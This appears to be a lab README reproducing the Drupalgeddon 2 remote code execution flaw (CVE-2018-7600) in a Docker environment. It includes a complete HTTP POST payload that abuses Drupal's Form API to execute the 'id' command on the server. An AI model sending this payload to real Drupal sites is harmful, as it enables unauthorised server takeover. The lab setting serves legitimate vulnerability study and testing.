# Drupal Drupalgeddon 2 Remote Code Execution Vulnerability (CVE-2018-7600)

Drupal is a large-scale CMS with a remote code execution vulnerability in the 6/7/8 version of the Form API. The relevant analysis is as follows:

- https://research.checkpoint.com/uncovering-drupalgeddon-2/

## vulnerability environment

Run the following command to start the environment of Drupal 8.5.0:

```
Docker-compose up -d
```

After the environment is started, visit `http://your-ip:8080/` and you will see the drupal installation page. The default configuration will be installed next. Because there is no mysql environment, so you can choose the sqlite database when installing.

## Vulnerability recurrence

Referring to [a2u/CVE-2018-7600] (https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py), we send the following packet to the installed drupal:

```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

Form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```

Successful execution of the code, this code eventually executed the id command:

![](1.png)